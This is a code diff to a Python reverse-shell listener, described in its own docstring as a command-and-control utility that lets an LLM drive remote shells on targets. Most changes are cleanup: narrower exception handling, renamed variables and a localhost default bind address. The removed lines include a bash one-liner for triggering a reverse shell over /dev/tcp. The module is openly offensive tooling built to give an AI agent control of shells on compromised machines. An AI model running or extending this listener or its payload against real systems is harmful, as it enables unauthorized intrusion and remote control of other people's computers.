@@ -1,3 +1,11 @@
+"""
+Command and control utility to power LLM client.
+
+This module provides a reverse shell client implementation that allows an LLM
+control and interact with remote shells.
+It handles starting/stopping listeners,
+sending commands, and managing shell sessions.
+"""
 import socket
 import sys
 import threading
@@ -13,12 +21,11 @@ class ReverseShellClient:
 
     The shells run in the background (second plane) while allowing the LLM to:
     - Compare and analyze command outputs
-    return f"'"
     - Chain commands across sessions
     - Monitor shell status
     """
 
-    def __init__(self, host='0.0.0.0', port=4444):
+    def __init__(self, host='127.0.0.1', port=4444):
         """
         Initialize reverse shell client
         Args:
@@ -50,7 +57,7 @@ class ReverseShellClient:
                 self.command_history.append(decoded_data)
                 sys.stdout.write(decoded_data)
                 sys.stdout.flush()
-            except BaseException:
+            except (OSError, UnicodeDecodeError):
                 break
         client_socket.close()
         self.client_socket = None
@@ -62,14 +69,14 @@ class ReverseShellClient:
             self.socket.bind((self.host, self.port))
             self.socket.listen(1)
             while self.running:
-                client, addr = self.socket.accept()
+                client_socket, _ = self.socket.accept()
                 client_handler = threading.Thread(
                     target=self.handle_client,
-                    args=(client,)
+                    args=(client_socket,)
                 )
                 client_handler.daemon = True
                 client_handler.start()
-        except Exception as e:
+        except OSError as e:
             print(f"Error in listener: {str(e)}")
         finally:
             if not self.running:
@@ -85,8 +92,7 @@ class ReverseShellClient:
         self.listener_thread.daemon = True
         self.listener_thread.start()
         self.socket.close()
-        return f"Listener started on {self.host}:{
-            self.port} use this to trigger the reverse shell in the target parameter/vector bash -c 'bash -i >& /dev/tcp/LISTENER_PORT/4444 0>&1'"
+        return f'Listener started on {self.host}:{self.port}'
 
     def stop(self):
         """
@@ -115,7 +121,7 @@ class ReverseShellClient:
         try:
             self.client_socket.send(f"{command}\n".encode())
             return {"status": "success", "message": "Command sent"}
-        except Exception as e:
+        except OSError as e:
             return {"status": "error", "message": str(e)}
 
     def show_session(self):
